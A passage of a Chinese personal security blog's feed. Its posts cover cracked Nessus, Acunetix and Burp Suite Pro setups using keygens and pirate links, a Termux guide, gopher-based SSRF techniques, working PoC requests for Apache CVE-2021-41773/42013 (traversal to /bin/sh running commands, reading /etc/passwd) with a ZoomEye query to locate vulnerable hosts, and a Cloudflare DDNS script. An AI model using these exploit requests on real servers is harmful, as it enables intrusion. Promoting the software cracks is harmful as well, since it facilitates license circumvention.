        <content type="html"><![CDATA[<h1 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h1><h2 id="Docker破解版"><a href="#Docker破解版" class="headerlink" title="Docker破解版"></a>Docker破解版</h2><blockquote><p>参考<a href="https://github.com/elliot-bia/nessus">elliot-bia&#x2F;nessus</a></p></blockquote><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name=ramisec_nessus -p 8834:8834 ramisec/nessus <span class="comment"># 即开即用</span></span><br><span class="line">docker <span class="built_in">exec</span> -it ramisec_nessus /opt/nessus/sbin/nessuscli chpasswd admin <span class="comment"># 强制重置admin密码</span></span><br></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>从 <a href="https://plugins.nessus.org/v2/offline.php">https://plugins.nessus.org/v2/offline.php</a> 获取插件更新包下载链接。页面需要填写两个参数，其中<code>challenge code</code>为40字符的hex字符串，任意机器码都可以，但是不要跟别人相同，可以使用<code>xxd -l 20 -p /dev/urandom</code>快速生成；<code>activation code</code>需要先从 <a href="https://www.tenable.com/products/nessus/nessus-essentials">https://www.tenable.com/products/nessus/nessus-essentials</a> 填写邮箱申请。</p><p>完成后页面会给出插件包下载链接，复制并替换更新命令的链接部分：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it ramisec_nessus /nessus/update.sh <span class="string">&quot;https://plugins.nessus.org/v2/nessus.php?f=all-2.0.tar.gz&amp;xxxxxxxxx&quot;</span></span><br></pre></td></tr></table></figure><p>执行后等待自动下载编译，耗时10~20分钟。</p><h3 id="重启动"><a href="#重启动" class="headerlink" title="重启动"></a>重启动</h3><p>机器重启后下一次启动只需<code>docker start ramisec_nessus</code></p><h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL: https://server_ip:8834/</span><br><span class="line">UserName: admin</span><br><span class="line">PassWord: (安装时你重置的admin密码)</span><br></pre></td></tr></table></figure><h1 id="Awvs"><a href="#Awvs" class="headerlink" title="Awvs"></a>Awvs</h1><h2 id="Windows-Linux破解版"><a href="#Windows-Linux破解版" class="headerlink" title="Windows&#x2F;Linux破解版"></a>Windows&#x2F;Linux破解版</h2><blockquote><p>原文：<a href="https://t.me/Pwn3rzs/1370">Pwn3rzs的tg频道</a></p></blockquote><p>下载链接: <a href="https://pwn3rzs.co/scanner_web/acunetix/Acunetix-v24.10.241106172-Windows-Pwn3rzs-CyberArsenal.rar">Windows</a> | <a href="https://pwn3rzs.co/scanner_web/acunetix/Acunetix-v24.10.241106172-Linux-Pwn3rzs-CyberArsenal.7z">Linux</a></p><p>解压密码: Pwn3rzs</p><p>当前版本: Acunetix v24.10.241106172 - 2024.11.07</p><h2 id="Docker破解版-1"><a href="#Docker破解版-1" class="headerlink" title="Docker破解版"></a>Docker破解版</h2><blockquote><p>2024-02-16，<a href="https://www.fahai.org/jszt/18.html">法海之路</a>宣布停更</p></blockquote><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><blockquote><p>偶然的机会，看到有人用<code>docker search awvs</code>来找awvs docker版镜像，于是发现<code>secfa/docker-awvs</code>(Crack By Pwn3zs)</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name=awvs --network=host --cap-add LINUX_IMMUTABLE secfa/docker-awvs</span><br></pre></td></tr></table></figure><h3 id="更新-1"><a href="#更新-1" class="headerlink" title="更新"></a>更新</h3><p>和通用的docker更新镜像思路一致</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker stop awvs</span><br><span class="line">docker <span class="built_in">rm</span> awvs</span><br><span class="line">docker image <span class="built_in">rm</span> secfa/docker-awvs</span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line">docker run -itd --name=awvs --network=host --cap-add LINUX_IMMUTABLE secfa/docker-awvs</span><br></pre></td></tr></table></figure><h3 id="访问-1"><a href="#访问-1" class="headerlink" title="访问"></a>访问</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL: https://server_ip:3443/#/login</span><br><span class="line">Username: admin@admin.com</span><br><span class="line">Password: Admin123</span><br></pre></td></tr></table></figure><h1 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h1><h2 id="Pro"><a href="#Pro" class="headerlink" title="Pro"></a>Pro</h2><blockquote><p>参考1: <a href="https://www.ddosi.org/burpsuite-pro-bcheck/">burpsuite pro 2023.6破解版 cracked 新增BCheck</a>, 2023.6.8更新</p><p>参考2: <a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">github&#x2F;h3110w0r1d-y&#x2F;BurpLoaderKeygen</a></p></blockquote><p>burpsuite pro 2024.11.2下载: <a href="https://portswigger-cdn.net/burp/releases/download?product=pro&version=2024.11.2&type=Jar">portswigger-cdn</a></p><p>BurpLoaderKeygen下载: <a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">github&#x2F;h3110w0r1d-y&#x2F;BurpLoaderKeygen</a></p><blockquote><p>BurpLoaderKeygen项目主页显示收到了portswigger官方的删档要求，在<a href="https://t.me/BurpLoaderKeygen/2">tg频道</a>可以下载，且用且珍惜！</p></blockquote><h3 id="BurpLoaderKeygen特性"><a href="#BurpLoaderKeygen特性" class="headerlink" title="BurpLoaderKeygen特性"></a>BurpLoaderKeygen特性</h3><ul><li>支持自动更新到最新稳定版(version &gt;&#x3D; 1.15)</li><li>支持注册机自动运行burpsuite，无需再自己写启动脚本(打开autorun选项即可)</li><li>支持自定义离线java环境(离线java环境放在同目录下，注册机优先加载<code>./bin/java</code>，然后才是全局java环境)</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android上的Linux模拟环境-Termux</title>
      <link href="/2022/12/03/Tools/termux/"/>
      <url>/2022/12/03/Tools/termux/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p><a href="https://github.com/termux/termux-app">github</a> or <a href="https://f-droid.org/en/packages/com.termux/">f-droid</a></p><h1 id="安装python"><a href="#安装python" class="headerlink" title="安装python"></a>安装python</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pkg install python</span><br><span class="line">pkg install rust <span class="comment"># 部分whl安装需要rust编译构建</span></span><br><span class="line">pkg install binutils <span class="comment"># 部分whl安装需要C编译构建</span></span><br><span class="line">pip install &lt;package&gt; <span class="comment"># 同PC端</span></span><br></pre></td></tr></table></figure><h2 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h2><h3 id="cryptography构建失败"><a href="#cryptography构建失败" class="headerlink" title="cryptography构建失败"></a>cryptography构建失败</h3><blockquote><p>参考<a href="https://github.com/termux/termux-packages/issues/12260">issue</a></p></blockquote><p>报错信息为<code>...failed to prepare thin LTO module: Opaque pointers are only supported in -opaque-pointers mode (Producer: &#39;LLVM15.0.1&#39; Reader: &#39;LLVM 15.0.1&#39;)...</code></p><p>解决办法：创建<code>~/.cargo/config.toml</code>:</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[profile.dev]</span></span><br><span class="line"><span class="attr">lto</span> = <span class="literal">false</span></span><br><span class="line"><span class="section">[profile.release]</span></span><br><span class="line"><span class="attr">lto</span> = <span class="literal">false</span></span><br><span class="line"><span class="section">[profile.test]</span></span><br><span class="line"><span class="attr">lto</span> = <span class="literal">false</span></span><br><span class="line"><span class="section">[profile.bench]</span></span><br><span class="line"><span class="attr">lto</span> = <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>上述会禁用编译时优化，或者<code>lto = &quot;fat&quot;</code>，只是编译速度会更慢。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> termux </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gopher协议利用</title>
      <link href="/2022/10/29/Web/gopher/"/>
      <url>/2022/10/29/Web/gopher/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文参照<a href="https://www.freebuf.com/articles/web/337824.html">Sch0lar gopher协议的利用</a></p></blockquote><h1 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h1><p>gopher协议是一个古老且强大的协议，可以理解为是http协议的前身，他可以实现多个数据包整合发送。通过gopher协议可以攻击内网的FTP、Telnet、Redis、Memcache，也可以进行GET、POST请求。</p><p>很多时候在SSRF下，我们无法通过HTTP协议来传递POST数据，这时候就需要用到gopher协议来发起POST请求了。</p><h1 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h1><p>gopher的协议格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;port&gt;</code>默认为70,发起多条请求每条要用CRLF(<code>%0d%0a</code>)去隔开，如果多个参数，参数之间的&amp;也需要进行URL编码</p><table><thead><tr><th>语言</th><th>支持情况</th></tr></thead><tbody><tr><td>PHP</td><td>–wite-curlwrappers且php版本至少为5.3</td></tr><tr><td>Java</td><td>小于JDK1.7</td></tr><tr><td>Curl</td><td>低版本不支持</td></tr><tr><td>Perl</td><td>支持</td></tr><tr><td>ASP.NET</td><td>小于版本3</td></tr></tbody></table><h1 id="利用gopher发起TCP单连接请求"><a href="#利用gopher发起TCP单连接请求" class="headerlink" title="利用gopher发起TCP单连接请求"></a>利用gopher发起TCP单连接请求</h1><p>根据gopher协议格式，当<code>&lt;gopher-path&gt;</code>为空时，可以发起单连接TCP请求，并接收返回包。</p><p>例如原始GET请求为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /s?wd=hello HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>改为gopher协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://www.baidu.com:80/_GET%20%2fs%3fwd%3dhello%20HTTP%2f1.1%0d%0aHost%3a%20www.baidu.com%0d%0a</span><br></pre></td></tr></table></figure><p>POST请求同理，但是POST请求至少包含4要素：<code>POST</code>,<code>Host</code>,<code>Content-Type</code>,<code>Content-Length</code></p><p>可以根据其他的使用TCP连接的上层协议编码后使用gopher协议传递，常见有<code>FTP</code>,<code>Telnet</code>,<code>Redis</code>,<code>Mysql（无密码）</code>。</p><blockquote><p>注意：gopher协议在ssrf中，作为HTTP请求的传递参数，要注意二次编码，因为后端收到HTTP数据会对请求头参数和大部分请求体参数进行一次URL-decode</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> gopher协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-41773 &amp; CVE-2021-42013 Apache HTTPd目录穿越&amp;RCE漏洞</title>
      <link href="/2022/10/29/RCE/Apache-Httpd/"/>
      <url>/2022/10/29/RCE/Apache-Httpd/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文参照<a href="https://blog.csdn.net/weixin_45694388/article/details/120801856">b1gpig安全</a></p></blockquote><h1 id="CVE-2021-41773漏洞描述"><a href="#CVE-2021-41773漏洞描述" class="headerlink" title="CVE-2021-41773漏洞描述"></a>CVE-2021-41773漏洞描述</h1><p>Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49&#x2F;2.4.50 路径穿越漏洞。由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Apache HTTPd 2.4.49&#x2F;2.4.50</p><h1 id="zoomeye语法"><a href="#zoomeye语法" class="headerlink" title="zoomeye语法"></a>zoomeye语法</h1><p>app:“apache web server 2.4.49 2.4.50”</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: your ip : port</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Sat, 16 Oct 2021 07:06:04 GMT</span><br><span class="line">If-None-Match: &quot;29cd-5ce72f1ed2f00-gzip&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Length: 41</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo Content-Type: text/plain; echo; ls</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: ip:port</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">If-None-Match: &quot;29cd-5ce4665e39700-gzip&quot;</span><br><span class="line">If-Modified-Since: Thu, 14 Oct 2021 01:57:16 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">echo; whoami</span><br></pre></td></tr></table></figure><h1 id="CVE-2021-42013目录穿越"><a href="#CVE-2021-42013目录穿越" class="headerlink" title="CVE-2021-42013目录穿越"></a>CVE-2021-42013目录穿越</h1><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>Apache HTTP Server 2.4.50版本对CVE-2021-41773的修复可以避免一次url编码导致的路径穿越，但是由于在请求处理过程中，还会调用ap_unescape_url函数对参数再次进行解码，仍然会导致路径穿越。</p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><code>GET ip:port/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd</code></p>]]></content>
      
      
      <categories>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> Web </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cloudflare-ddns脚本</title>
      <link href="/2022/09/05/Network/ddns/"/>
      <url>/2022/09/05/Network/ddns/</url>
      
        <content type="html"><![CDATA[<h1 id="Cloudflare-ddns"><a href="#Cloudflare-ddns" class="headerlink" title="Cloudflare-ddns"></a>Cloudflare-ddns</h1><p>require: <code>python -m pip install requests</code></p><p>cloudflare_ddns.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># @Time    : 2025-01-09 23:44:00</span></span><br><span class="line"><span class="comment"># @Author  : m0ch</span></span><br><span class="line"><span class="comment"># @Version : 1.3</span></span><br><span class="line"><span class="comment"># @License : GPLv2.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, time, logging, logging.handlers, os</span><br><span class="line"></span><br><span class="line">ENDPOINT = <span class="string">&quot;https://api.cloudflare.com/client/v4&quot;</span></span><br><span class="line">API_TOKEN = <span class="string">&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">ZONE_IDS = &#123;</span><br><span class="line">    <span class="string">&quot;test.xyz&quot;</span>: <span class="string">&quot;1234567890abcdef1234567890abcdef&quot;</span>,</span><br><span class="line">    <span class="string">&quot;test.com&quot;</span>: <span class="string">&quot;1234567890abcdef1234567890abcdef&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line">rf = logging.handlers.RotatingFileHandler(filename=<span class="string">&quot;cloudflare_ddns.log&quot;</span>, maxBytes=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">4</span>, backupCount=<span class="number">3</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">fmt = logging.Formatter(fmt=<span class="string">&quot;%(asctime)s [%(levelname)s] %(funcName)s line%(lineno)d: %(message)s&quot;</span>, </span><br><span class="line">                                datefmt=<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">rf.setFormatter(fmt)</span><br><span class="line">logger.addHandler(rf)</span><br><span class="line">logger.setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_zone_id</span>(<span class="params">dns_name</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> ZONE_IDS.items():</span><br><span class="line">        <span class="keyword">if</span> dns_name.endswith(k):</span><br><span class="line">            <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dns_id</span>(<span class="params">zone_id, dns_name</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;ENDPOINT&#125;</span>/zones/<span class="subst">&#123;zone_id&#125;</span>/dns_records&quot;</span></span><br><span class="line">    params = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;name&quot;</span>: dns_name, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;direction&quot;</span>: <span class="string">&quot;desc&quot;</span>, <span class="string">&quot;match&quot;</span>: <span class="string">&quot;any&quot;</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer %s&quot;</span> % API_TOKEN, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    response = requests.get(url=url, params=params, headers=headers, timeout=<span class="number">15</span>).json()</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> response[<span class="string">&quot;result&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> item[<span class="string">&quot;name&quot;</span>] == dns_name:</span><br><span class="line">            <span class="keyword">return</span> item[<span class="string">&quot;id&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_dns_record</span>(<span class="params">zone_id, dns_name, ip6</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;ENDPOINT&#125;</span>/zones/<span class="subst">&#123;zone_id&#125;</span>/dns_records&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;name&quot;</span>: dns_name, <span class="string">&quot;content&quot;</span>: ip6, <span class="string">&quot;ttl&quot;</span>: <span class="number">60</span>, <span class="string">&quot;proxied&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer %s&quot;</span> % API_TOKEN, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    response = requests.post(url=url, json=data, headers=headers, timeout=<span class="number">15</span>).json()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_dns_record</span>(<span class="params">zone_id, dns_id, dns_name, ip6</span>):</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;ENDPOINT&#125;</span>/zones/<span class="subst">&#123;zone_id&#125;</span>/dns_records/<span class="subst">&#123;dns_id&#125;</span>&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;name&quot;</span>: dns_name, <span class="string">&quot;content&quot;</span>: ip6, <span class="string">&quot;ttl&quot;</span>: <span class="number">60</span>, <span class="string">&quot;proxied&quot;</span>: <span class="literal">False</span>&#125;</span><br><span class="line">    headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer %s&quot;</span> % API_TOKEN, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">    response = requests.put(url=url, json=data, headers=headers, timeout=<span class="number">15</span>).json()</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ipv6</span>():</span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&quot;posix&quot;</span>:</span><br><span class="line">        <span class="keyword">with</span> os.popen(<span class="string">&quot;ip -6 address show dev eth0 scope global | grep mngtmpaddr | grep -iv deprecated&quot;</span>) <span class="keyword">as</span> warp:</span><br><span class="line">            ipv6 = warp.read().split()[<span class="number">1</span>].split(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> os.name == <span class="string">&quot;nt&quot;</span>:</span><br><span class="line">        <span class="keyword">with</span> os.popen(<span class="string">&#x27;powershell -c &quot;Get-NetIPAddress -AddressFamily IPv6 -AddressState Preferred -SuffixOrigin Link -PrefixOrigin RouterAdvertisement&quot;&#x27;</span>) <span class="keyword">as</span> warp:</span><br><span class="line">            ipv6 = warp.read().split()[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;os is not supported.&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;:&quot;</span> <span class="keyword">in</span> ipv6:</span><br><span class="line">        <span class="keyword">return</span> ipv6</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;fail to get IPv6 address.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_ipv6_record</span>(<span class="params">dns_name, ip6</span>):</span><br><span class="line">    zone_id = get_zone_id(dns_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zone_id:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;failed to get zone_id, check the domain: %s&quot;</span> % dns_name)</span><br><span class="line">    dns_id = get_dns_id(zone_id, dns_name)</span><br><span class="line">    <span class="keyword">if</span> dns_id:</span><br><span class="line">        <span class="keyword">return</span> update_dns_record(zone_id, dns_id, dns_name, ip6)</span><br><span class="line">    <span class="keyword">return</span> create_dns_record(zone_id, dns_id, dns_name, ip6)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    dns_names = [<span class="string">&quot;1.test.xyz&quot;</span>, <span class="string">&quot;2.test.com&quot;</span>]</span><br><span class="line">    last_ip6 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ip6 = get_ipv6()</span><br><span class="line">            <span class="keyword">if</span> ip6 == last_ip6:</span><br><span class="line">                time.sleep(<span class="number">300</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> dns_name <span class="keyword">in</span> dns_names:</span><br><span class="line">                result = set_ipv6_record(dns_name, ip6)</span><br><span class="line">                logger.info(<span class="built_in">str</span>(result))</span><br><span class="line">            last_ip6 = ip6</span><br><span class="line">            time.sleep(<span class="number">300</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last_ip6 = <span class="string">&quot;&quot;</span></span><br><span class="line">            logger.error(<span class="string">&quot;%s %s&quot;</span>,<span class="built_in">type</span>(e), e.args)</span><br><span class="line">            time.sleep(<span class="number">60</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> DNS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cloudflare </tag>
            
            <tag> dns </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习笔记</title>
      <link href="/2022/08/21/Tools/docker/"/>
      <url>/2022/08/21/Tools/docker/</url>
      
